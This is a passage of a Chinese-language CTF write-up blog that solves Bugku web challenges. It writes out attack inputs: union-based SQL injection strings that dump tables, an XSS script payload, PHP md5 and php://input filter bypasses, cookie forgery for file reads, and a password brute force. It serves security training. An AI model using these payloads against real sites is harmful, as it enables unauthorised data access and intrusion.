class="line">%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62%35%34%61%61%32%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b</span><br></pre></td></tr></table></figure><p>url解码一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"undefined"</span> != <span class="keyword">typeof</span> a) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span> == a.value) <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        alert(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line">        a.focus();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit = checkSubmit;</span><br></pre></td></tr></table></figure><blockquote><p>KEY{J22JK-HS11} </p></blockquote><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><blockquote><p><a href="http://120.24.86.145:8002/baopo/" target="_blank" rel="noopener">http://120.24.86.145:8002/baopo/</a></p><p>作者：Se7en</p></blockquote><p>提示说是五位数密码，那就用bp爆破一下吧</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527053661254.png" alt="1527053661254"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527053675368.png" alt="1527053675368"></p><p>设置好之后点start attack</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527053711626.png" alt="1527053711626"></p><p>在pwd=13579的时候返回flag</p><blockquote><p>flag{bugku-baopo-hah}</p></blockquote><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><blockquote><p><a href="http://120.24.86.145:9001/test/" target="_blank" rel="noopener">http://120.24.86.145:9001/test/</a> </p><p>hints:JavaScript </p></blockquote><p>查看源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line"> $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   $(<span class="string">"#cookie"</span>)</span><br><span class="line">     .mousedown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       $(<span class="keyword">this</span>).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">     &#125;)</span><br><span class="line">     .mouseup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       $(<span class="keyword">this</span>).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">       clicks++;</span><br><span class="line">       $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">       <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p>当clicks&gt;1000000时，post  clicks参数过去</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527056312520.png" alt="1527056312520"></p><blockquote><p>flag{Not_C00kI3Cl1ck3r} </p></blockquote><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><blockquote><p><a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/</a></p><p> 听说备份是个好习惯 </p></blockquote><p>尝试一波备份的文件名，尝试index.php.bak的时候成功了，下载下来拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这代码看起来很熟悉的样子，不就是校赛的md5么</p><p>payload</p><blockquote><p><a href="http://120.24.86.145:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=0" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=0</a></p></blockquote><blockquote><p>Bugku{OH_YOU_FIND_MY_MOMY} </p></blockquote><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><blockquote><p>快来查查成绩吧 </p><p><a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; order by 4 %23</span><br><span class="line"></span><br><span class="line">id=-1&apos; union select 1,database(),user(),4 %23</span><br><span class="line"></span><br><span class="line">id=-1&apos; union select 1,group_concat(table_name) ,user(),4  from information_schema.tables where table_schema = database()%23</span><br><span class="line"></span><br><span class="line">id=-1&apos; union select 1,group_concat(skctf_flag) ,user(),4  from fl4g %23</span><br></pre></td></tr></table></figure><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><blockquote><p><a href="http://120.24.86.145:8002/qiumingshan/" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/</a></p><p>是不是老司机试试就知道。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    source = s.get(url)</span><br><span class="line">    expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()</span><br><span class="line">    <span class="comment"># print(expression)</span></span><br><span class="line">    result = eval(expression)</span><br><span class="line">    data = &#123;<span class="string">'value'</span>: result&#125;</span><br><span class="line">    print(s.post(url,data=data).text)</span><br></pre></td></tr></table></figure><p><a href="http://www.bugku.com/thread-1057-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-1057-1-1.html</a></p><p><a href="https://blog.csdn.net/EustiaSora/article/details/79142835" target="_blank" rel="noopener">https://blog.csdn.net/EustiaSora/article/details/79142835</a></p><p><a href="https://blog.csdn.net/hawkerou/article/details/53518154" target="_blank" rel="noopener">python字符串切割：str.split()和re.split()对比</a> </p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><blockquote><p>速度要快！！！！！！</p><p><a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">http://120.24.86.145:8002/web6/</a></p><p>格式KEY{xxxxxxxxxxxxxx}</p></blockquote><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><p>抓包发现返回报头有flag字段</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527092023569.png" alt="1527092023569"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/24 0:02</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : bugku-web6.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">r = session.get(url)</span><br><span class="line">get = str(r.headers[<span class="string">'flag'</span>])</span><br><span class="line">print(get)</span><br><span class="line">flag = base64.b64decode(str(r.headers[<span class="string">'flag'</span>]))</span><br><span class="line">flag = base64.b64decode(str(flag).split(<span class="string">':'</span>)[<span class="number">1</span>][<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line"><span class="comment"># print(str(flag).split(':')[1][1:-1])</span></span><br><span class="line">print(str(flag)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'margin'</span>: str(flag)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="详解-CTF-Web-中的快速反弹-POST-请求"><a href="#详解-CTF-Web-中的快速反弹-POST-请求" class="headerlink" title="详解 CTF Web 中的快速反弹 POST 请求"></a><a href="https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/" target="_blank" rel="noopener">详解 CTF Web 中的快速反弹 POST 请求</a></h3><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><blockquote><p><a href="http://120.24.86.145:8002/web11/" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/</a></p><p>答案格式：KEY{xxxxxxxx}</p></blockquote><p>注意到URL为</p><blockquote><p><a href="http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p></blockquote><blockquote><p>a2V5cy50eHQ=</p></blockquote><p>base64解码得</p><blockquote><p>keys.txt</p></blockquote><p>于是<code>index.php</code>base64编码为<code>aW5kZXgucGhw</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527093238992.png" alt="1527093238992"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527093265272.png" alt="1527093265272"></p><p>于是一句一句的复制出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析一波代码，</p><p>当cookie存在margin并且margin=margin时，file_list[2]赋值为keys.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当file在file_list中存在时，才会输出文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是</p><p><code>keys.php</code> base64编码为 <code>a2V5cy5waHA=</code></p><p>在cookie加上magin=margin，就可以拿到KEY</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527093560247.png" alt="1527093560247"></p><blockquote><p>KEY{key_keys}</p></blockquote><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote><p><a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">http://103.238.227.13:10089/</a></p><p>Flag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx</p></blockquote><p>首先我们查看源代码 发现可以通过xss注入  所以我们只需将&lt;和&gt;转义即可  于是我们构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure><p>即可获得flag</p><blockquote><p>Flag:17f094325e90085b30a5ddefce34acd8 </p></blockquote><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><blockquote><p><a href="http://120.24.86.145:8006/test/hello.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test/hello.php</a></p><p>作者：御结冰城</p></blockquote><p>查看源代码，发现有注释</p><blockquote><!--1p.html--> </blockquote><p>访问<code>view-source:http://120.24.86.145:8006/test/1p.html</code></p><p>有一段JavaScript代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = <span class="built_in">unescape</span>(Words);</span><br><span class="line"><span class="built_in">document</span>.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="comment">// --&gt;</span></span><br></pre></td></tr></table></figure><p>%3D是=，于是把Words这一串先url解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span><br></pre></td></tr></table></figure><p>再把注释起来的字符串base64解码，解码发现有很多%22之类的，再url解码一下得到php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://wiki.jikexueyuan.com/project/php/regular-expression/eregi.html" target="_blank" rel="noopener">eregi()函数</a>在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 </p><p>具体分析这篇博客讲得很清楚，奉上链接</p><p><a href="https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/" target="_blank" rel="noopener">https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/</a></p><p><a href="http://www.am0s.com/ctf/128.html" target="_blank" rel="noopener">CTF之PHP黑魔法总结</a></p><p>payload</p><blockquote><p>120.24.86.145:8006/test/hello.php?id=.&amp;b=%0012345&amp;a=php://input</p><p>bugku is a nice plateform!</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527136472042.png" alt="1527136472042"></p><blockquote><p>flag{tHis_iS_THe_fLaG}</p></blockquote><h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><blockquote><p><a href="http://120.24.86.145:8006/test1/" target="_blank" 